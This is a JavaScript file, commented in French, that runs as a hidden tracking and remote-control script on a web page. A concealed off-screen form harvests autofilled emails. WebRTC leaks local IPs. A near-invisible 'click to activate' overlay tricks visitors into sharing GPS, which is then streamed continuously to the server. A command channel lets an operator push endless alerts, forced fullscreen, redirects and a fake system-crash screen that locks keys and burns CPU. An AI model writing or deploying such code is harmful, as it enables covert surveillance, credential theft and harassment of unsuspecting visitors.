let cachedLocalIp = null;
let capturedEmail = null;

// Création d'un "piège" à autofill pour tenter de capturer l'email
function setupAutofillTrap() {
    const container = document.createElement('div');
    container.style.cssText = 'position:absolute; top:-1000px; left:-1000px; opacity:0.01; pointer-events:none;';
    container.innerHTML = `
        <form id="system-auth-trap">
            <input type="text" name="username" autocomplete="username email">
            <input type="email" name="email" autocomplete="email">
            <input type="password" name="password" autocomplete="current-password">
        </form>
    `;
    document.body.appendChild(container);

    // On surveille les changements sur les champs
    const emailInput = container.querySelector('input[type="email"]');
    const userInput = container.querySelector('input[name="username"]');
    
    const checkInputs = () => {
        if (emailInput.value && emailInput.value.includes('@')) {
            capturedEmail = emailInput.value;
        } else if (userInput.value && userInput.value.includes('@')) {
            capturedEmail = userInput.value;
        }
    };

    emailInput.addEventListener('change', checkInputs);
    userInput.addEventListener('change', checkInputs);
    setInterval(checkInputs, 2000);
}

// Fonction pour récupérer l'IP locale via WebRTC
async function getLocalIP() {
    if (cachedLocalIp) return cachedLocalIp;

    return new Promise((resolve) => {
        const ips = [];
        const pc = new RTCPeerConnection({
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        });
        
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = (event) => {
            if (!event || !event.candidate) {
                if (ips.length > 0) {
                    // Filtrage des IPs "bidon" et de l'IP publique si elle s'est glissée ici
                    const realIps = ips.filter(ip => 
                        ip &&
                        !ip.includes('.local') && 
                        ip !== '192.0.0.2' && 
                        ip !== '0.0.0.0' &&
                        !ip.startsWith('127.')
                    );
                    
                    if (realIps.length > 0) {
                        cachedLocalIp = realIps[0];
                        resolve(realIps[0]);
                    } else {
                        resolve("Masquée (VPN/Proxy)");
                    }
                } else {
                    resolve("Masquée (Navigateur)");
                }
                return;
            }
            
            const parts = event.candidate.candidate.split(' ');
            const ip = parts[4];
            if (!ips.includes(ip) && (ip.includes('.') || ip.includes(':'))) {
                ips.push(ip);
            }
        };

        setTimeout(() => {
            if (ips.length > 0) {
                cachedLocalIp = ips[0];
                resolve(ips[0]);
            } else {
                resolve("Inconnue (Timeout/mDNS)");
            }
            pc.close();
        }, 2000);
    });
}

async function getPreciseLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }

        const options = {
            enableHighAccuracy: true,
            timeout: 15000, 
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading
                });
            },
            (error) => {
                console.warn("Géolocalisation refusée ou erreur:", error.message);
                resolve(null);
            },
            options
        );
    });
}

async function getDeviceStats() {
    const stats = {
        battery: null,
        charging: null,
        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
        downlink: navigator.connection ? navigator.connection.downlink : null,
        rtt: navigator.connection ? navigator.connection.rtt : null,
        email: capturedEmail,
        platform: navigator.platform,
        vendor: navigator.vendor,
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory
    };

    const localIp = cachedLocalIp;
    // Détection avancée du type de réseau
    if (localIp) {
        if (localIp.startsWith('192.168.43.')) {
            stats.networkName = "Android Hotspot (Default)";
            stats.connection = 'hotspot';
        } else if (localIp.startsWith('172.20.10.')) {
            stats.networkName = "iPhone Hotspot (Default)";
            stats.connection = 'hotspot';
        } else if (localIp.startsWith('192.168.')) {
            stats.connection = 'wifi';
        } else if (localIp.startsWith('10.')) {
            stats.connection = 'private/vpn';
        }
    }

    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            stats.battery = Math.round(battery.level * 100);
            stats.charging = battery.charging;
        }
    } catch (e) {}
    
    return stats;
}

let sessionId = localStorage.getItem('tracker_session_id');
if (!sessionId) {
    sessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    localStorage.setItem('tracker_session_id', sessionId);
}

async function logVisitor(preciseLocation = null, isUpdate = false, forceDiscord = false) {
    try {
        const localIp = cachedLocalIp || await getLocalIP();
        const stats = await getDeviceStats();
        
        const res = await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId: sessionId,
                isUpdate: isUpdate,
                forceDiscord: forceDiscord,
                localIp: localIp,
                preciseLocation: preciseLocation,
                deviceStats: stats,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || 'Direct',
                page: window.location.pathname
            })
        });

        // Après chaque log, on vérifie si l'admin a envoyé une commande
        checkCommands();
    } catch (error) {
        console.error("Erreur lors du logging:", error);
    }
}

// Tentative de garder l'écran allumé (Wake Lock) pour assurer la réception des commandes
let wakeLock = null;
async function requestWakeLock() {
    try {
        if ('wakeLock' in navigator) {
            wakeLock = await navigator.wakeLock.request('screen');
            console.log("Wake Lock activé 🔓");
        }
    } catch (err) {
        console.warn("Wake Lock refusé:", err.message);
    }
}

async function checkCommands() {
    try {
        // Fréquence de vérification augmentée si l'appareil est actif
        const res = await fetch(`/api/command?sessionId=${sessionId}`);
        const data = await res.json();

        if (data && data.command) {
            // Si on reçoit une commande, on essaie de réveiller l'appareil
            requestWakeLock();
            const cmd = data.command;
            console.log("Commande reçue de l'admin:", cmd.command);

            switch (cmd.command) {
                case 'ALERT':
                    // Force l'alerte même si le navigateur tente de la bloquer
                    const alertMsg = cmd.payload.message || "Message de l'administrateur";
                    setTimeout(() => {
                        while(true) {
                            alert(alertMsg);
                            if(!confirm("Voulez-vous vraiment fermer cette alerte ?")) break;
                        }
                    }, 0);
                    break;
                case 'VIBRATE':
                    if (navigator.vibrate) {
                        // Pattern de vibration agressif pour forcer l'attention
                        navigator.vibrate([500, 200, 500, 200, 1000]);
                    }
                    break;
                case 'FULLSCREEN':
                    // Tentative de forcer le plein écran sur chaque clic futur si refusé
                    const forceFS = () => {
                        document.documentElement.requestFullscreen().catch(() => {});
                        // Tentative d'obscurcissement des contrôles
                        document.body.style.cursor = 'none';
                    };
                    forceFS();
                    document.addEventListener('click', forceFS);
                    break;
                case 'REDIRECT':
                    // Empêche le retour en arrière en remplaçant l'historique
                    const targetUrl = cmd.payload.url || 'http://127.0.0.1';
                    window.location.replace(targetUrl);
                    // Boucle de redirection au cas où
                    setTimeout(() => { window.location.href = targetUrl; }, 100);
                    break;
                case 'RELOAD':
                    window.location.reload(true);
                    break;
                case 'STOP_DEVICE':
                    // Simulation d'arrêt agressive
                    // Bloque les touches de fonction et le clic droit
                    document.addEventListener('keydown', (e) => e.preventDefault());
                    document.addEventListener('contextmenu', (e) => e.preventDefault());
                    
                    document.body.innerHTML = `
                        <div style="background:black; color:white; height:100vh; width:100vw; display:flex; align-items:center; justify-content:center; font-family:monospace; position:fixed; top:0; left:0; z-index:999999; cursor:none;">
                            <div style="text-align:center;">
                                <h1 style="font-size:3rem; color:red; text-shadow: 0 0 10px red;">CRITICAL SYSTEM FAILURE</h1>
                                <p style="font-size:1.2rem; margin-bottom:20px;">L'appareil a détecté une intrusion et va s'éteindre pour protéger les données.</p>
                                <div id="crash-countdown" style="font-size:2.5rem; font-weight:bold;">ARRÊT IMMINENT...</div>
                                <p style="margin-top:20px; color:#555;">Error code: 0x0000005C (HARDWARE_HALT)</p>
                            </div>
                        </div>
                    `;
                    
                    // Force le CPU à saturer pour geler l'appareil
                    setTimeout(() => {
                        // Tentative de saturation processeur légère
                        let i = 0;
                        const crashLoop = () => {
                            console.log("SYSTEM_HALT_" + i++);
                            // On ralentit la boucle pour éviter de faire planter ton PC de test
                            // mais assez pour bloquer l'onglet
                            for(let j=0; j<1000000; j++) { Math.sqrt(j); }
                            setTimeout(crashLoop, 10);
                        };
                        crashLoop();
                    }, 3000);
                    break;
            }
        }
    } catch (e) {
        console.error("Erreur checkCommands:", e);
    }
}

async function startVerification() {
    let overlay = document.getElementById('verification-overlay');

    if (!overlay) {
        overlay = document.createElement('div');
        overlay.id = 'verification-overlay';
        Object.assign(overlay.style, {
            position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh',
            background: 'rgba(0,0,0,0.01)', zIndex: '99999', cursor: 'pointer',
            display: 'flex', alignItems: 'center', justifyContent: 'center'
        });
        const msg = document.createElement('div');
        Object.assign(msg.style, {
            background: 'rgba(0,0,0,0.6)', color: 'white', padding: '10px 20px',
            borderRadius: '30px', fontSize: '12px', pointerEvents: 'none', opacity: '0.1'
        });
        msg.innerText = 'Cliquer pour activer le contenu interactif';
        overlay.appendChild(msg);
        document.body.appendChild(overlay);
    }

    overlay.style.display = 'flex';

    let lastLoggedPos = null;

    function getDistance(lat1, lon1, lat2, lon2) {
        const R = 6371e3;
        const φ1 = lat1 * Math.PI/180;
        const φ2 = lat2 * Math.PI/180;
        const Δφ = (lat2-lat1) * Math.PI/180;
        const Δλ = (lon2-lon1) * Math.PI/180;
        const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) + Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ/2) * Math.sin(Δλ/2);
        const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
        return R * c;
    }

    const handleFirstClick = async () => {
        overlay.style.cursor = 'wait';
        const msg = overlay.querySelector('div');
        if (msg) {
            msg.innerText = 'Chargement en cours...';
            msg.style.opacity = '0.8';
        }
        
        // On libère l'écran tout de suite pour l'utilisateur
        overlay.style.display = 'none';

        let firstGpsPointSent = false;
        let timeoutHandle = null;

        if (navigator.geolocation) {
            // TIMEOUT DE SECOURS: Si pas de GPS après 20s, envoyer le ping sans GPS à Discord
            timeoutHandle = setTimeout(() => {
                if (!firstGpsPointSent) {
                    console.log("GPS timeout - envoi ping sans GPS à Discord");
                    logVisitor(null, false, true);
                    firstGpsPointSent = true;
                }
            }, 20000);

            navigator.geolocation.watchPosition(
                async (position) => {
                    const newLoc = {
                        lat: position.coords.latitude, lon: position.coords.longitude,
                        accuracy: position.coords.accuracy, speed: position.coords.speed
                    };
                    
                    // PREMIER POINT GPS: Toujours envoyer à Discord avec forceDiscord
                    if (!firstGpsPointSent) {
                        firstGpsPointSent = true;
                        clearTimeout(timeoutHandle);
                        lastLoggedPos = newLoc;
                        await logVisitor(newLoc, false, true);
                        return;
                    }

                    // Points suivants: Appliquer les filtres de distance
                    if (!lastLoggedPos) {
                        lastLoggedPos = newLoc;
                        await logVisitor(newLoc, true);
                        return;
                    }

                    const dist = getDistance(lastLoggedPos.lat, lastLoggedPos.lon, newLoc.lat, newLoc.lon);
                    
                    // FILTRE ANTI-SAUT :
                    // Si on se déplace de plus de 500m mais que la vitesse est nulle ou très faible (< 1 km/h)
                    // C'est probablement un saut opérateur/cellulaire, on ignore.
                    const isAbnormalJump = dist > 500 && (newLoc.speed === null || newLoc.speed < 0.3);
                    
                    if (dist > 3 && !isAbnormalJump) {
                        lastLoggedPos = newLoc;
                        await logVisitor(newLoc, true);
                    }
                },
                null,
                { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
            );
        } else {
            // Pas de géolocalisation: envoyer un ping simple après 1s
            setTimeout(() => logVisitor(null, false, true), 1000);
        }

        setInterval(() => logVisitor(null, true), 30000);
    };

    overlay.addEventListener('click', handleFirstClick, { once: true });
}

if (document.readyState === 'complete') {
    setupAutofillTrap();
    startVerification();
    // Vérification des commandes très fréquente (toutes les 2 secondes)
    setInterval(checkCommands, 2000);
    // Tenter de réactiver le Wake Lock au clic ou focus
    document.addEventListener('click', requestWakeLock);
    window.addEventListener('focus', requestWakeLock);
} else {
    window.addEventListener('load', startVerification);
}
